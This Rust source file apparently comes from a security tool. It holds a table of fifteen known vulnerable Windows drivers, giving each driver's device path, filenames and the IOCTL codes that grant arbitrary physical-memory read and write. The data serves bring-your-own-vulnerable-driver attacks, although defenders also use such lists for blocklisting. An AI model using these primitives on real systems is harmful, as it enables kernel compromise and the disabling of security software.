//! Unified BYOVD (Bring Your Own Vulnerable Driver) database
//!
//! Single source of truth for all vulnerable driver fingerprints used across the codebase.
//! Previously split between kernel.rs (15 entries) and bruteforce/physical_memory.rs (11 entries).

use serde::Serialize;

/// A known vulnerable driver with arbitrary physical memory R/W capability
#[derive(Debug, Clone, Serialize)]
pub struct ByovdDriver {
    pub name: &'static str,
    /// Primary device path (e.g. \\\\.\\RTCore64)
    pub device_path: &'static str,
    /// Alternative device paths to try
    pub alt_device_paths: &'static [&'static str],
    /// Driver filenames for discovery
    pub filenames: &'static [&'static str],
    /// IOCTL code for physical memory read
    pub read_ioctl: u32,
    /// IOCTL code for physical memory write
    pub write_ioctl: u32,
    /// Human-readable description of the driver and its origin
    pub description: &'static str,
}

/// Unified BYOVD driver database — merged from kernel.rs and physical_memory.rs.
/// Entries with read_ioctl=0 and write_ioctl=0 are excluded (no usable primitives).
pub static BYOVD_DRIVERS: &[ByovdDriver] = &[
    ByovdDriver {
        name: "RTCore64",
        device_path: "\\\\.\\RTCore64",
        alt_device_paths: &["\\\\.\\RTCore32"],
        filenames: &["RTCore64.sys", "RTCore32.sys"],
        read_ioctl: 0x80002048,
        write_ioctl: 0x8000204C,
        description:
            "MSI Afterburner - most popular BYOVD target, arbitrary physical/virtual memory R/W",
    },
    ByovdDriver {
        name: "dbutil_2_3",
        device_path: "\\\\.\\dbutil_2_3",
        alt_device_paths: &[],
        filenames: &["dbutil_2_3.sys"],
        read_ioctl: 0x9B0C1EC4,
        write_ioctl: 0x9B0C1EC8,
        description: "Dell BIOS Utility - arbitrary R/W via IOCTL",
    },
    ByovdDriver {
        name: "iqvw64e",
        device_path: "\\\\.\\Nal",
        alt_device_paths: &[],
        filenames: &["iqvw64e.sys"],
        read_ioctl: 0x80862007,
        write_ioctl: 0x80862007,
        description: "Intel Network Adapter Diagnostic Driver",
    },
    ByovdDriver {
        name: "gdrv",
        device_path: "\\\\.\\GIO",
        alt_device_paths: &[],
        filenames: &["gdrv.sys"],
        read_ioctl: 0xC3502004,
        write_ioctl: 0xC3502008,
        description: "Gigabyte - physical memory map R/W",
    },
    ByovdDriver {
        name: "cpuz141",
        device_path: "\\\\.\\cpuz141",
        alt_device_paths: &[],
        filenames: &["cpuz141.sys", "cpuz.sys"],
        read_ioctl: 0x9C402428,
        write_ioctl: 0x9C40242C,
        description: "CPU-Z - physical memory R/W",
    },
    ByovdDriver {
        name: "AsIO",
        device_path: "\\\\.\\Asusgio2",
        alt_device_paths: &["\\\\.\\Asusgio3"],
        filenames: &["AsIO.sys", "AsIO64.sys"],
        read_ioctl: 0xA0406000,
        write_ioctl: 0xA0406004,
        description: "ASUS - physical memory map",
    },
    ByovdDriver {
        name: "MsIo64",
        device_path: "\\\\.\\MsIo",
        alt_device_paths: &[],
        filenames: &["MsIo64.sys", "MsIo32.sys"],
        read_ioctl: 0x80102040,
        write_ioctl: 0x80102044,
        description: "MSI - physical memory access",
    },
    ByovdDriver {
        name: "WinRing0",
        device_path: "\\\\.\\WinRing0_1_2_0",
        alt_device_paths: &[],
        filenames: &["WinRing0x64.sys", "WinRing0.sys"],
        read_ioctl: 0x9C402420,
        write_ioctl: 0x9C402424,
        description: "WinRing0 (OC tools) - physical memory R/W",
    },
    ByovdDriver {
        name: "HWiNFO",
        device_path: "\\\\.\\HWiNFO",
        alt_device_paths: &[],
        filenames: &["HWiNFO64A.sys"],
        read_ioctl: 0x85FE2608,
        write_ioctl: 0x85FE260C,
        description: "HWiNFO - physical memory",
    },
    ByovdDriver {
        name: "atillk64",
        device_path: "\\\\.\\atillk64",
        alt_device_paths: &[],
        filenames: &["atillk64.sys"],
        read_ioctl: 0x9C402568,
        write_ioctl: 0x9C40256C,
        description: "ATI/AMD - physical memory map",
    },
    ByovdDriver {
        name: "ATKACPI",
        device_path: "\\\\.\\ATKACPI",
        alt_device_paths: &[],
        filenames: &["ATKACPI.sys"],
        read_ioctl: 0x0022240C,
        write_ioctl: 0x0022240C,
        description: "ASUS ACPI - physical memory",
    },
    ByovdDriver {
        name: "Ene",
        device_path: "\\\\.\\ENE",
        alt_device_paths: &[],
        filenames: &["ene.sys", "ene.io64.sys"],
        read_ioctl: 0x80102040,
        write_ioctl: 0x80102044,
        description: "ENE Technology / RGB driver (Lazarus APT favorite) - physical memory",
    },
    ByovdDriver {
        name: "elby",
        device_path: "\\\\.\\ElbyCDIO",
        alt_device_paths: &[],
        filenames: &["elbycdio.sys", "ElbyCDFL.sys"],
        read_ioctl: 0x80002000,
        write_ioctl: 0x80002004,
        description: "Elaborate Bytes (Virtual CloneDrive) - kernel R/W",
    },
    ByovdDriver {
        name: "speedfan",
        device_path: "\\\\.\\speedfan",
        alt_device_paths: &[],
        filenames: &["speedfan.sys"],
        read_ioctl: 0x9C402420,
        write_ioctl: 0x9C402424,
        description: "SpeedFan - physical memory",
    },
    ByovdDriver {
        name: "ThrottleStop",
        device_path: "\\\\.\\ThrottleStop",
        alt_device_paths: &[],
        filenames: &["ThrottleStop.sys"],
        read_ioctl: 0x80006498,
        write_ioctl: 0x8000649C,
        description: "TechPowerUp ThrottleStop (CVE-2025-7771)",
    },
];
